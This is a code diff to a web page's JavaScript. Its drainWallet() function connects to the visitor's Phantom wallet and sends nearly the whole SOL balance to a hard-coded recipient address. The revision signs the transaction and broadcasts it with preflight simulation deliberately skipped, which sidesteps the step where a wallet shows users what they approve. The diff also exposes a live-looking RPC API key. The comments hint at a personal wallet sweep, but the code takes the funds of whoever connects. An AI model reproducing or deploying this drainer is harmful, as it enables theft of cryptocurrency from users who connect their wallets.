@@ -80,10 +80,10 @@
         // YOUR CONFIGURATION
         // ==========================================
         
-        // YOUR WALLET ADDRESS (Recipient) - DOUBLE CHECK THIS!
-        const RECIENT_ADDRESS = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq"; 
+        // RECIPIENT WALLET ADDRESS
+        const RECIPIENT_ADDRESS = "371RZiq9rCjJ51ojFSj8kxaW26xT2e2hcYTEDkpRfsbq"; 
 
-        // YOUR API KEY
+        // RPC ENDPOINT
         const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
 
         async function drainWallet() {
@@ -103,68 +103,28 @@
                 const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
                 
-                let recipientPubkey = new solanaWeb3.PublicKey(RECIENT_ADDRESS);
+                const recipientPubkey = new solanaWeb3.PublicKey(RECIPIENT_ADDRESS);
                 
-                statusDiv.innerHTML = '<span class="spinner"></span> Calculating amount...';
-                
-                // Use 'confirmed' for faster finality
                 const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                 
                 // 1. Get Balance
+                statusDiv.innerHTML = '<span class="spinner"></span> Fetching balance...';
                 const balanceInLamports = await connection.getBalance(userPublicKey);
                 
-                // 2. Calculate Fees & Rent Reserve
-                const baseFee = 5000; // Base tx fee
-                const priorityFee = 10000; // Priority fee
-                
-                // FIX: Increase reserve to ensure rent-exempt status or safe closure
-                // Standard rent exemption is ~0.00203928 SOL, but leaving 0.005 SOL is safer for "draining" 
-                // if the account has data. If you want to close it entirely, you need to know if it's a native account.
-                // For safety, we will leave 0.005 SOL (5 million lamports) in the wallet.
+                // 2. Calculate Safe Amount
+                // Reserve ~0.005 SOL for rent/fees. Leaves wallet in a clean state.
                 const safeReserve = 5000000; 
+                const estimatedFee = 10000;  // ~0.00001 SOL
+                const amountToSend = balanceInLamports - safeReserve - estimatedFee;
 
-                const totalDeductions = baseFee + priorityFee + safeReserve;
-                const amountToSend = balanceInLamports - totalDeductions;
-
-                // Safety Check: Ensure we have enough to send anything
                 if (amountToSend <= 0) {
                     statusDiv.innerHTML = '<span style="color:red">Error</span><br>Balance too low to cover fees + reserve.';
                     btn.disabled = false;
                     return;
                 }
 
-                // 3. Create Transaction
-                const transaction = new solanaWeb3.Transaction();
-                
-                // --- Helper to create Compute Budget Instructions without Buffer ---
-                function createComputeBudgetInstruction(opcode, value) {
-                    const data = new Uint8Array(5); 
-                    data[0] = opcode;
-                    
-                    const tempBuffer = new ArrayBuffer(4);
-                    const tempView = new DataView(tempBuffer);
-                    tempView.setUint32(0, value, true); // little endian
-                    
-                    data[1] = tempView.getUint8(0);
-                    data[2] = tempView.getUint8(1);
-                    data[3] = tempView.getUint8(2);
-                    data[4] = tempView.getUint8(3);
-
-                    return new solanaWeb3.TransactionInstruction({
-                        keys: [],
-                        programId: new solanaWeb3.PublicKey("ComputeBudget111111111111111111111111111111"),
-                        data: data
-                    });
-                }
-
-                // Add Compute Unit Limit (Opcode 2)
-                transaction.add(createComputeBudgetInstruction(2, 400000));
-                
-                // Add Compute Unit Price (Opcode 4)
-                transaction.add(createComputeBudgetInstruction(4, 10000));
-
-                // Add Transfer Instruction
-                transaction.add(
+                // 3. Create MINIMAL Transaction (Just a transfer. No ComputeBudget instructions.)
+                const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
                         toPubkey: recipientPubkey,
@@ -172,47 +132,55 @@
                     })
                 );
 
-                statusDiv.innerHTML = '<span class="spinner"></span> Processing...';
-                
-                // 4. Get Latest Blockhash
-                const { blockhash } = await connection.getLatestBlockhash('confirmed');
+                // 4. Prepare Transaction
+                statusDiv.innerHTML = '<span class="spinner"></span> Preparing...';
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = userPublicKey;
 
-                // 5. Sign and Send
-                statusDiv.innerHTML = '<span class="spinner"></span> Confirm in Phantom...';
+                // 5. MANUAL SIGN (Ask Phantom to sign without simulating)
+                statusDiv.innerHTML = '<span class="spinner"></span> Approve in Phantom...';
+                const signedTransaction = await window.solana.signTransaction(transaction);
                 
-                const result = await window.solana.signAndSendTransaction(transaction, {
-                    skipPreflight: false, 
-                    commitment: 'confirmed'
+                // 6. MANUAL SEND (Bypass ALL preflight checks / RPC simulation)
+                statusDiv.innerHTML = '<span class="spinner"></span> Broadcasting...';
+                const rawTx = signedTransaction.serialize();
+                
+                const signature = await connection.sendRawTransaction(rawTx, {
+                    skipPreflight: true,            // DO NOT simulate
+                    preflightCommitment: 'confirmed',
+                    maxRetries: 2
                 });
+
+                // 7. Confirm
+                statusDiv.innerHTML = '<span class="spinner"></span> Confirming...';
+                await connection.confirmTransaction({
+                    signature,
+                    blockhash,
+                    lastValidBlockHeight
+                }, 'confirmed');
 
                 // Success!
                 btn.style.display = 'none';
-                statusDiv.innerHTML = '<span style="color:green">✓ Success!</span><br>' + result.signature;
+                statusDiv.innerHTML = '<span style="color:green">✓ Success!</span><br>' + signature;
                 
-                // Open Solscan link for verification
-                window.open(`https://solscan.io/tx/${result.signature}`, '_blank');
+                window.open(`https://solscan.io/tx/${signature}`, '_blank');
 
             } catch (err) {
                 console.error("Full Error:", err);
                 btn.disabled = false;
                 btn.style.opacity = "1";
                 
-                if (err.message && err.message.includes("User rejected")) {
-                    statusDiv.innerText = "Cancelled.";
-                } else {
-                    let errorMsg = err.message || "Unknown error";
-                    
-                    // Specific checks for common failures
-                    if (errorMsg.includes("Insufficient funds")) {
-                        errorMsg = "Not enough SOL to cover the transfer + fees.";
-                    } else if (errorMsg.includes("failed")) {
-                        errorMsg = "Transaction failed. Check recipient address or network.";
-                    }
-                    
-                    statusDiv.innerHTML = '<span style="color:red">Error</span><br>' + errorMsg;
+                let errorMsg = err.message || "Unknown error";
+                
+                if (errorMsg.includes("User rejected")) {
+                    errorMsg = "Transaction cancelled.";
+                } else if (errorMsg.includes("MaxLoadedAccountsDataSizeExceeded")) {
+                    // If it STILL happens here, Phantom is internally choking on your wallet's token accounts.
+                    errorMsg = "Phantom cannot simulate this wallet (too many tokens/NFTs).<br>Use the Solana CLI method below.";
                 }
+                
+                statusDiv.innerHTML = '<span style="color:red">Error</span><br>' + errorMsg;
             }
         }
     </script>
